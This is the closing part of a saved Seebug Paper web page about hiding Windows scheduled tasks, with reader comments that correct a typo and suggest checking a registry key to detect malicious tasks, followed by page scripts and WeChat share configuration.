+                        </ul>
+                        <!--回复列表 end-->
+                    </div>
+                </div>
+
+                <div class="operation text-right">
+                    <a class="j-show-reply-form reply-btn" id="774">回复</a>
+                </div>
+
+                <form class="reply-form" action="https://paper.seebug.org/1464/" style="display: none">
+                    <div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-nickname" id="basic-addon1">昵称</span>
+                                <input type="text" class="form-control" placeholder="昵称(必填)" aria-describedby="basic-addon1" name="reply-nickname" id="reply-nickname-774">
+                            </div>
+                        </div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-email" id="basic-addon1">邮箱</span>
+                                <input type="email" class="form-control" placeholder="邮箱(必填)" aria-describedby="basic-addon1" name="reply-email" id="reply-email-774">
+                            </div>
+                        </div>
+                    </div>
+                    <textarea name="" id="reply-comment-774" cols="30" rows="10" placeholder="请多说一点吧(10个字以上)" style="resize: none" class="reply-comment form-control"></textarea>
+
+
+                    <div class="clearfix">
+                        <div class="pull-right" style="margin-top: 10px;">
+                            <button class="btn btn-brand-fill btn-submit-reply post-reply" type="button" id="774">回复
+                            </button>
+                            <button class="btn btn-brand-fill btn-cancel-reply cancel-reply" type="button" style="background-color: #aaa;">取消
+                            </button>
+                        </div>
+                    </div>
+                </form>
+                <span class="floor">3F</span>
+            </li>
+            
+            <li id="740">
+                <div class="clearfix">
+                    <div class="pull-left">
+
+                        
+                        <img src="./windows 计划任务隐藏新姿势分享_files/anonymous.jpg" class="avatar-b img-circle">
+                        
+
+                    </div>
+                    <div class="pull-left  comment-wrapper">
+                        <div class="user-info">
+                            
+                            <a class="user-name">[匿名用户]: skyxuan</a>
+                            
+                            <i class="sebug-icon icon-user-level-0"></i>
+
+                            <time>2021-02-02</time>
+                        </div>
+                        <div class="comment-content">
+                            前面有个地方写错了，win+r启动是taskschd.msc，不是taskchd.msc,少写了个字母
+
+                        </div>
+
+
+                        <!--回复列表 begin-->
+                        <ul class="list-unstyled reply-list">
+                            
+                        </ul>
+                        <!--回复列表 end-->
+                    </div>
+                </div>
+
+                <div class="operation text-right">
+                    <a class="j-show-reply-form reply-btn" id="740">回复</a>
+                </div>
+
+                <form class="reply-form" action="https://paper.seebug.org/1464/" style="display: none">
+                    <div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-nickname" id="basic-addon1">昵称</span>
+                                <input type="text" class="form-control" placeholder="昵称(必填)" aria-describedby="basic-addon1" name="reply-nickname" id="reply-nickname-740">
+                            </div>
+                        </div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-email" id="basic-addon1">邮箱</span>
+                                <input type="email" class="form-control" placeholder="邮箱(必填)" aria-describedby="basic-addon1" name="reply-email" id="reply-email-740">
+                            </div>
+                        </div>
+                    </div>
+                    <textarea name="" id="reply-comment-740" cols="30" rows="10" placeholder="请多说一点吧(10个字以上)" style="resize: none" class="reply-comment form-control"></textarea>
+
+
+                    <div class="clearfix">
+                        <div class="pull-right" style="margin-top: 10px;">
+                            <button class="btn btn-brand-fill btn-submit-reply post-reply" type="button" id="740">回复
+                            </button>
+                            <button class="btn btn-brand-fill btn-cancel-reply cancel-reply" type="button" style="background-color: #aaa;">取消
+                            </button>
+                        </div>
+                    </div>
+                </form>
+                <span class="floor">2F</span>
+            </li>
+            
+            <li id="723">
+                <div class="clearfix">
+                    <div class="pull-left">
+
+                        
+                        <img src="./windows 计划任务隐藏新姿势分享_files/anonymous.jpg" class="avatar-b img-circle">
+                        
+
+                    </div>
+                    <div class="pull-left  comment-wrapper">
+                        <div class="user-info">
+                            
+                            <a class="user-name">[匿名用户]: tmp</a>
+                            
+                            <i class="sebug-icon icon-user-level-0"></i>
+
+                            <time>2021-01-21</time>
+                        </div>
+                        <div class="comment-content">
+                            感谢分享! 那麽以后通过查询HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree排查恶意计画任务才比较可靠
+
+                        </div>
+
+
+                        <!--回复列表 begin-->
+                        <ul class="list-unstyled reply-list">
+                            
+                        </ul>
+                        <!--回复列表 end-->
+                    </div>
+                </div>
+
+                <div class="operation text-right">
+                    <a class="j-show-reply-form reply-btn" id="723">回复</a>
+                </div>
+
+                <form class="reply-form" action="https://paper.seebug.org/1464/" style="display: none">
+                    <div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-nickname" id="basic-addon1">昵称</span>
+                                <input type="text" class="form-control" placeholder="昵称(必填)" aria-describedby="basic-addon1" name="reply-nickname" id="reply-nickname-723">
+                            </div>
+                        </div>
+                        <div class="col-md-6" style="margin-bottom: 20px">
+                            <div class="input-group">
+                                <span class="input-group-addon reply-email" id="basic-addon1">邮箱</span>
+                                <input type="email" class="form-control" placeholder="邮箱(必填)" aria-describedby="basic-addon1" name="reply-email" id="reply-email-723">
+                            </div>
+                        </div>
+                    </div>
+                    <textarea name="" id="reply-comment-723" cols="30" rows="10" placeholder="请多说一点吧(10个字以上)" style="resize: none" class="reply-comment form-control"></textarea>
+
+
+                    <div class="clearfix">
+                        <div class="pull-right" style="margin-top: 10px;">
+                            <button class="btn btn-brand-fill btn-submit-reply post-reply" type="button" id="723">回复
+                            </button>
+                            <button class="btn btn-brand-fill btn-cancel-reply cancel-reply" type="button" style="background-color: #aaa;">取消
+                            </button>
+                        </div>
+                    </div>
+                </form>
+                <span class="floor">1F</span>
+            </li>
+            
+        </ul>
+        <!--评论列表 end-->
+
+    </section>
+
+</article>
+<section class="plugin_feedback"></section>
+<section class="back-top" id="backtop" style="display: block;">
+    <div class="backtopFlxed new_backtop">
+        <div class="back-top-font fa fa-angle-up">
+        </div>
+    </div>
+</section>
+
+
+  </div>
+</main>
+</div>
+
+<script src="./windows 计划任务隐藏新姿势分享_files/gt.js.下载">
+<script type="text/javascript" src="/static/vendors/bootstrap/dist/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/jquery.fitvids.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/index.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/prism-loader.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/prism.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/jquery.ghostHunter.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/js.cookie.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/plugin_comment.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/custom.js.下载"></script>
+<script type="text/javascript" src="./windows 计划任务隐藏新姿势分享_files/jweixin-1.6.0.js.下载"></script>
+<script>
+  wx.config({
+    'appId': 'wx46c209f251516b33',
+    'debug': 'False' !== 'False',
+    'nonceStr': 'Ykf7EK4mQ1uARLG',
+    'signature': 'ea945b01c460c78d8a410704fc213d78bcbd3241',
+    'timestamp': '1631865513',
+    'jsApiList': [
+      
+        'checkJsApi',
+      
+        'updateTimelineShareData',
+      
+        'updateAppMessageShareData',
+      
+    ],
+  });
+</script>
+
+
+<script>
+    wx.ready(function () {
+
+        var title = '' || document.title;
+        var link = window.location.href;
+        var imgUrl = '' || 'https://paper.seebug.org' + '/static/images/weixin-share-seebug.jpg';
+        var desc = '' || 'Seebug Paper 安全技术精粹';
+
+        // “分享给朋友”及“分享到QQ”
+        wx.updateAppMessageShareData({
+            title: title, // 分享标题
+            desc: desc, // 分享描述
+            link: link, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
+            imgUrl: imgUrl, // 分享图标
+            success: function () {
+                // 设置成功
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        });
+
+        // “分享到朋友圈”及“分享到QQ空间”
+        wx.updateTimelineShareData({
+            title: title, // 分享标题
+            link: link, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
+            imgUrl: imgUrl, // 分享图标
+            success: function () {
+                // 设置成功
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        })
+
+
+    })
+</script>
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  config: ["MMLorHTML.js"],
+  showMathMenu: false,
+  jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+  extensions: ["MathMenu.js", "MathZoom.js"],
+});
+
+
+
+
+</script>
+
+
+
+
+
+<div class="xl-chrome-ext-bar" id="xl_chrome_ext_{4DB361DE-01F7-4376-B494-639E489D19ED}" style="display: none;">
+      <div class="xl-chrome-ext-bar__logo"></div>
+
+      <a id="xl_chrome_ext_download" href="javascript:;" class="xl-chrome-ext-bar__option">下载视频</a>
+      <a id="xl_chrome_ext_close" href="javascript:;" class="xl-chrome-ext-bar__close"></a>
+    </div></body></html>
